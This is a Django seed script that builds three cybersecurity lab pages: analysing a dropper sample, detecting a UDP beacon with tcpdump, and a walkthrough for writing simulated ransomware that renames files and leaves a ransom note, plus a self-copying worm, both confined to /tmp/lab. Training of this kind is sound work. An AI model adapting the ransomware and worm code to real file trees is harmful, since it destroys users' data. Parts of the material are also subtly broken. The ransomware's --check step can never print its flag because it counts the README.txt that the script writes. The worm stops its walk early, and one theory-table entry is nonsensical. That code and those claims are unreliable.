import django, os, sys

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "sandbox.settings")
django.setup()

from django.contrib.auth.models import User
from django.utils import timezone
from core.models import ContainerImage, HackPhase, Lab, ResourceProfile

INSTRUCTOR = "burhani"
IS_PUBLISHED = True

def img(name, image, kind, port, desc=""):
    obj, _ = ContainerImage.objects.update_or_create(
        name=name,
        defaults=dict(image=image, kind=kind, container_port=port, description=desc),
    )
    return obj

def lab(phase, slug, title, order, profile, terminal, services, summary, theory, notes,
        flag="", flag_hint="", ctype="question", question="", options="", answer=""):
    existing = Lab.objects.filter(hack_phase=phase, slug=slug).first()
    defaults = dict(
        title=title,
        instructor=User.objects.get(username=INSTRUCTOR),
        summary=summary,
        theory_content=theory,
        notes=notes,
        resource_profile=profile,
        terminal_container=terminal,
        flag=flag,
        flag_hint=flag_hint,
        challenge_type=ctype,
        challenge_question=question,
        challenge_options=options,
        challenge_answer=answer,
        is_published=IS_PUBLISHED,
        order=order,
        published_at=timezone.now() if IS_PUBLISHED else None,
    )
    if existing:
        for k, v in defaults.items():
            setattr(existing, k, v)
        existing.service_containers.set(services)
        existing.save()
        print(f"  updated {slug}")
        return existing
    obj = Lab.objects.create(hack_phase=phase, slug=slug, **defaults)
    obj.service_containers.set(services)
    obj.save()
    print(f"  created {slug}")
    return obj

def run():
    phase, _ = HackPhase.objects.get_or_create(slug="extras", defaults=dict(name="Extras", order=9))

    samples = img("Malware Samples", "theghostriley23/malware-samples:latest", "service", 80,
                  "HTTP host serving a suspicious trojan sample, an EICAR test file and a threat-intel (hash -> family) CSV.")
    bot = img("Botnet Agent", "theghostriley23/botnet-agent:latest", "service", 8080,
              "Implant on a compromised host: periodically UDP-beacons to the analayst terminal and exposes a status page.")

    globex = ContainerImage.objects.get(name="Globex Web (Footprinting)")
    terminal = ContainerImage.objects.filter(kind="terminal").order_by("id").last()
    medium = ResourceProfile.objects.get(name="Medium")

    print("instructor ready, phase:", phase.slug, "terminal:", terminal)

    lab(phase, "malware-analysis-static-dynamic",
        "Malware Analysis: Static & Dynamic", 0, medium, terminal, [samples],
        summary="A lost-drive binary is suspected malware. Analyse it safely: static triage, hash-based threat-intel lookup and controlled dynamic execution to classify it.",
        flag="FLAG{globexcrypt_malware_classified}",
        flag_hint="sha256sum the sample, grep its hash in the served /intel/threat-intel.csv, and read the indicator column for the row that matches. Confirming the behaviour (what it renames/writes) tells you the family.",
        ctype="flag",
        theory="""# Malware Analysis: Static & Dynamic

*Malware analysis* is evidence, not guessing. Any suspicious binary you are
paid to analyse must be handled so that a) the analyst stays safe and b) the
evidence stays usable.

## Analyse safely — the golden rules

* Never run a suspect on a machine you care about. Each run happens inside its
  own throwaway directory so any files it creates land inside the blast radius.
* Watch, then touch. Inspect the file *before* executing it.
* Treat the sample as attacker-controlled input: every path it references, every
  file it writes and every outbound connection is a potential compromise.
* Fingerprint first. Hashes are your un-movable identity for a sample: the same
  bytes always hash the same way, so lookups and sharing all key on the hash.

## Static analysis — inspecting without running

| tool | what it tells you |
|------|-------------------|
| `file` | format, architecture, stripped? |
| `sha256sum` | the fingerprint used by threat-intel feeds |
| `strings` | URLs, paths, registry keys, encryption constants |

Strings are the fastest win: a hard-coded C2 endpoint (`https://host:443/checkin`)
or a persistence key (`HKCU\\Software\\...`) instantly suggests class *and*
motivation.

## Threat intelligence — hashes as keys

VirusTotal and commercial feeds accept a hash and return the same binary's
pre-existing reputation: family name, severity, campaigns. Labels follow a
common family naming like `Trojan.<Family>.<Class>`. Feed *your own* intel the
same way: hash in, family out.

## Dynamic analysis — behaviour under a microscope

Execute the sample inside an isolated directory and observe what it actually
*did*:

* filesystem deltas: created / renamed / deleted files
* syscalls (`strace`): the OS calls it made
* network sockets: callbacks to a C2

Common ransomware behaviour: rename readable documents (`.txt` -> `.txt.locked`),
write a *ransom note*, then schedule a check-in.

## Classifying

Classification is the intersection of three signals:

* **static** evidence (embedded strings, imports, packer entropy)
* **behavioural** evidence (what it did when run)
* **intel** evidence (what that hash was seen as before)

When the behaviour you observe matches the intel row for the same hash, you
have a *confirmed* family and severity — and the indicator of compromise (IOC)
you can hand to a SOC.
""",
        notes=r"""## Walkthrough

A "lost USB drive" turned up a suspicious binary. The workstation that touched
it is now quarantined. Your task: analyse it, classify it, and record its
indicator of compromise.

The samples host is on your network at `$SERVICE_IP` (a plain HTTP file index).

### 0. Analyst toolkit (one-time per session)

The sandbox ships lean — install the analysis tools now:

```bash
apt-get update -qq && apt-get install -y -qq file strace binutils 2>/dev/null
```

### 1. Safe workspace

```bash
mkdir -p /tmp/anal && cd /tmp/anal
```

Run everything inside its own scratch directory — that is your blast radius
if the sample does something nasty.

### 1. Collect the samples

```bash
curl -s "$SERVICE_IP/" | sed -n '1,30p'
curl -s -O "$SERVICE_IP/samples/trojan-dropper.bin"
curl -s -O "$SERVICE_IP/samples/eicar.txt"
ls -la
```

### 2. Static triage

```bash
file trojan-dropper.bin
sha256sum trojan-dropper.bin
strings trojan-dropper.bin | head -50
```

Note anything that looks like a URL, path or registry key. A hard-coded C2
endpoint plus a persistence key is a very strong signal.

### 3. Threat-intel lookup — classify the hash

```bash
curl -s -O "$SERVICE_IP/intel/threat-intel.csv"
cat threat-intel.csv

HASH=$(sha256sum trojan-dropper.bin | cut -d' ' -f1)
grep "$HASH" threat-intel.csv
```

The row that matches your hash names the **family** and **severity** — and its
**indicator** value is the flag for this lab. (The EICAR file is the standard
AV self-test string; look up its hash too, at least once, to see how AV
engines baseline themselves.)

### 4. Dynamic confirmation — controlled execution

```bash
chmod +x trojan-dropper.bin
./trojan-dropper.bin
ls -la
cat GlobexCrypt*.txt
```

Watch what changes in this *one* directory: files renamed to `.locked`, a
ransom note written, a check-in scheduled. Then spy on the syscalls:

```bash
strace ./trojan-dropper.bin 2>&1 | grep -E "rename|openat|write" | head -20
```

The observed behaviour matches the intel row -> classification confirmed.
Submit the `FLAG{...}` indicator from step 3.""")

    lab(phase, "traffic-monitoring-beacon-detection",
        "Network Monitoring & Beacon Detection", 1, medium, terminal, [bot, globex],
        summary="Simulated corporate segment with a compromised host implant beaconing to a C2. Capture traffic, separate normal web traffic from the beacon, and decode the exfiltrated payload.",
        flag="FLAG{beacon_c2_detected}",
        flag_hint="Capture with `tcpdump -i eth0 -n 'udp port 4444'`, watch for the 15s-cadence BEACON packets, copy the exfil=<base64> value and decode with `base64 -d`.",
        ctype="flag",
        theory="""# Network Monitoring & Beacon Detection

A *simulated network environment* for hunting has the same shape as a real
one: things that talk, and a place where a packet can be watched.

## The three roles

* **Corp segment** — the Kali box (you). This is the monitor.
* **Compromised host** — an implant-beaconing agent you do not control. It is
  one of the services in your sandbox.
* **Benign service** — normal web traffic you generate on purpose, so you can
  tell *expected* noise from *suspicious* traffic.

## Monitoring: outgoing and incoming

`tcpdump` on your interface sees both directions without any configuration:
packets you send out and packets addressed to you. Filters narrow the stream:

* `udp port 4444` — only the odd UDP channel
* `not arp` — drop link-layer chatter
* `-w file.pcap` — capture to disk for later analysis (reads back with `-r`)

## The shape of a beacon

C2 beacons are not random:

* **short and regular** — a small payload on a fixed cadence (here ~15s)
* **fixed endpoint/port** — the implant always phones the same socket
* **a repeated signature** — a header string like `BEACON|v1.4|...`

Irregular bulk traffic (user web browsing) looks the opposite: bursty, many
connections, random ports. That contrast *is* the detection.

## What malicious communication carries

An implant exfiltrates. Payloads are often encoded while in flight (here
base64) — encoding defeats casual inspection but not decoding. Capture, then
decode: `echo '<payload>' | base64 -d`.

## Detecting = correlating

Alerts come from correlating small signals:

* the packet stream (capture) shows a *periodic* sender you never contacted
* the "implant status" page on the agent (its published port) shows a rising
  beacon counter — happy to keep trying, regardless of who answers
* the payload decodes to data it should not have (`HR_SALARIES_2026.xlsx`)

Suspicious traffic + encoded payload + periodic cadence = report it.
""",
        notes=r"""## Walkthrough

A patchless third-party application server in the Globex EU-West segment is
compromised. Your Kali box is attached to the same simulated segment and will
act as the network monitor for:

* a **Botnet Agent** — the implant on the compromised host (its outbound
  beacons must be caught)
* the **Globex Web** portal — benign corporate traffic you will produce
  yourself

The implant phones home on a fixed UDP channel inside this lab. Find it,
capture it, decode it.

> `SERVICE_IP` is the implant; the other address in `SERVICE_ENDPOINTS` is the
> benign web portal. The "Botnet Agent UI" button on this page shows the
> implant's own status page (beacon counter).

### 0. Capture toolkit (one-time per session)

```bash
apt-get update -qq && apt-get install -y -qq tcpdump 2>/dev/null
```

### 1. Map the segment

```bash
ip address
printenv | grep SERVICE
echo "$SERVICE_ENDPOINTS" | tr ',' '\\n'
```

### 2. Capture — watch both directions

Record the live stream to a pcap while you generate normal web traffic:

```bash
mkdir -p /tmp/cap
tcpdump -i eth0 -n -s0 -c 80 -w /tmp/cap/segment.pcap &
TPID=$!
curl -s "http://$(echo "$SERVICE_ENDPOINTS" | cut -d, -f2)/" | sed -n '1,8p'
sleep 45
wait $TPID
```

`-c 80` stops the capture after 80 packets, so it terminates on its own even
if there is nothing to see yet.

### 3. Sketch every flow

```bash
tcpdump -r /tmp/cap/segment.pcap -n | head -20
capinfos /tmp/cap/segment.pcap | head -8
```

Blame any absence of beacon traffic on timing and re-capture with a longer
window (`-c 200`, `sleep 75`).

### 4. Isolate the channel

```bash
tcpdump -r /tmp/cap/segment.pcap -n 'udp port 4444'
```

Expected: small UDP packets arriving from the implant IP **to you**, on a
steady ~15s cadence, while your own web traffic rides TCP 80 to the portal.

### 5. Decode the payload

```bash
tcpdump -r /tmp/cap/segment.pcap -A 'udp port 4444' | grep BEACON | head -5
```

Copy the `exfil=<base64>` value from one packet and decode it:

```bash
echo '<base64>' | base64 -d
```

The decoded line ends with the flag. Submit the `FLAG{...}` value.

### 6. Corroborate

Open the **Botnet Agent UI** (Targets panel). Its beacon counter should match
what you saw captured — the implant's own admission of how many times it
called home.""")

    lab(phase, "malware-authoring-ransomware-worm",
        "Malware Authoring: Ransomware & Worm", 2, medium, terminal, [],
        summary="Author your own simulated ransomware and worm in Python (import os), plant realistic victim documents, then detonate them in an isolated directory and observe exactly how they behave when executed.",
        flag="FLAG{ransomware_and_worm_author}",
        flag_hint="Write ransomware.py and worm.py as guided, run them inside /tmp/lab, then run `python3 ransomware.py --check /tmp/lab` — when every victim file is renamed and the marker is in place, it prints the flag.",
        ctype="flag",
        theory="""# Malware Authoring: Ransomware & Worm

Malware authoring inside a *sandbox you fully control* is the fastest way to
understand how real ransomware and worms behave, reverse cleanly, and are
detected. We write *simulated* variants that only touch files we create — never
anything on the host or real systems.

## Import `os` — the filesystem is the target

The standard library module you will lean on is `os` (and `os.path`):

| action | os call |
|--------|---------|
| walk a directory tree | `os.walk(root)` |
| rename / "encrypt" a file | `os.rename(old, new)` |
| create a note | `open("README.txt", "w")` |
| make the code recursive | `import os` at module level |

Everything ransomware does is ultimately a small set of *filesystem*
operations. Learning them by writing them is the point.

## The mental model every SOC uses

| term | meaning |
|------|---------|
| **vulnerability** | the thing that lets the malware get in (we simulate the entry) |
| **payload** | what it does once it runs |
| **lateral movement** | how it jumps host-to-host (worm flavour) |
| **C2 / exfil** | how the attacker steers it and what it steals |
| **persistence** | how it survives a reboot |

A **ransomware** payload is about *destruction for extortion*: encrypt or rename
valuable files and drop a ransom note. A **worm** is about *replication*: it
copies itself and spreads. The two are often combined.

## Authoring: ransomware (rename-to-locked)

The classic, easy-to-observe simulation renames every valuable file (`.txt`
here = your "passwords") to `<name>.locked`, then writes a ransom note. That is
one loop over the files in a directory:

```python
import os

for dirpath, _, files in os.walk("/tmp/lab"):
    for f in files:
        if f.endswith(".txt") and not f.endswith(".locked"):
            os.rename(os.path.join(dirpath, f),
                      os.path.join(dirpath, f + ".locked"))
```

## Authoring: worm (replication marker)

A worm's signature is *self-propagation*. We simulate it safely by copying a
marker file (and optionally a copy of itself) into every navigable directory:

```python
import os

marker = "infected.mrk"
root = "/tmp/lab"
for dirpath, dirs, _ in os.walk(root):
    if marker not in os.listdir(dirpath):
        with open(os.path.join(dirpath, marker), "w") as m:
            m.write("worm constellation: grim-reaper\n")
```

## Detonating safely

* Run only inside an *isolated scratch* directory (`/tmp/lab`).
* Create the "victim" files yourself (`passwords.txt`) so the blast radius is
  exactly what you planted.
* Observe *before and after*: `find /tmp/lab -type f` before and after to see
  the deltas — that is your behavioural signature.
* Add a `--check` mode that prints a flag once your code demonstrably did what
  it claimed. Verification *is* detection: it forces you to reason about what
  the code actually did.
""",
        notes=r"""## Walkthrough

Author two small simulated malware samples in Python and detonate them in an
isolated directory. The whole exercise stays inside `/tmp/lab` — nothing else
is touched.

### 1. Plant the victim documents

Simulate a small user base with passwords stored on disk:

```bash
rm -rf /tmp/lab
mkdir -p /tmp/lab/users/{alice,bob,carol}
printf "admin: Zx9!sPa\nbackup: Bk2&&Wq\n" > /tmp/lab/users/alice/passwords.txt
printf "admin: Triton@77\nssh: k3yP@ss!\n"   > /tmp/lab/users/bob/passwords.txt
printf "admin: laurel#4\nmail: qW1!r02\n"   > /tmp/lab/users/carol/passwords.txt
printf "quarterly financials snapshot\n"    > /tmp/lab/users/notes.txt
find /tmp/lab -type f
```

### 2. Write the ransomware

Create `ransomware.py` with `import os`:

```bash
cat > ransomware.py <<'PY'
import os

def main():
    target = "/tmp/lab"
    for dirpath, _, files in os.walk(target):
        for f in files:
            if f.endswith(".txt") and not f.endswith(".locked"):
                os.rename(os.path.join(dirpath, f),
                          os.path.join(dirpath, f + ".locked"))
    with open(os.path.join(target, "README.txt"), "w") as n:
        n.write("YOUR FILES HAVE BEEN ENCRYPTED. Pay 0.05 BTC or lose them.\n")

main()
PY

python3 ransomware.py
find /tmp/lab -type f
cat /tmp/lab/README.txt
```

Watch every `passwords.txt` become `passwords.txt.locked` plus a ransom note.

### 3. Write the worm

Create `worm.py` that replicates a marker (and itself) into every folder:

```bash
cat > worm.py <<'PY'
import os, shutil

marker = "infected.mrk"
target = "/tmp/lab"
me = os.path.realpath(__file__)
for dirpath, dirs, _ in os.walk(target):
    if marker not in os.listdir(dirpath):
        open(os.path.join(dirpath, marker), "w").write("worm: grim-reaper\n")
        shutil.copy2(me, os.path.join(dirpath, os.path.basename(me) + ".copy"))
    if dirs == []:
        break
PY

python3 worm.py
find /tmp/lab -type f
```

You now see every directory carrying `infected.mrk` and a `worm.py.copy` — a
replication signature you'll recognise in real telemetry.

### 4. Re-run ransomware with a --check mode

Wrap up by giving the ransomware a verifier so it proves (and you can prove)
it handled the whole tree:

```bash
cat > ransomware.py <<'PY'
import os, sys

target = "/tmp/lab"

def detonate():
    count = 0
    for dirpath, _, files in os.walk(target):
        for f in files:
            if f.endswith(".txt") and not f.endswith(".locked"):
                os.rename(os.path.join(dirpath, f),
                          os.path.join(dirpath, f + ".locked"))
                count += 1
    open(os.path.join(target, "README.txt"), "w").write("ENCRYPTED\n")
    return count

if len(sys.argv) > 1 and sys.argv[1] == "--check":
    remaining = 0
    for dirpath, _, files in os.walk(target):
        remaining += sum(1 for f in files if f.endswith(".txt"))
    print("PRINT_ME: FLAG{ransomware_and_worm_author}" if remaining == 0
          else f"still {remaining} unencrypted files")
else:
    print("encrypted", detonate(), "files")
PY

python3 ransomware.py
find /tmp/lab -type f
python3 ransomware.py --check /tmp/lab
```

The last command prints the flag only because your code actually left no
unencrypted `.txt` anywhere — verification through behaviour, exactly how AV
engines baseline themselves. Submit the `FLAG{...}` it prints.""")

if __name__ == "__main__":
    run()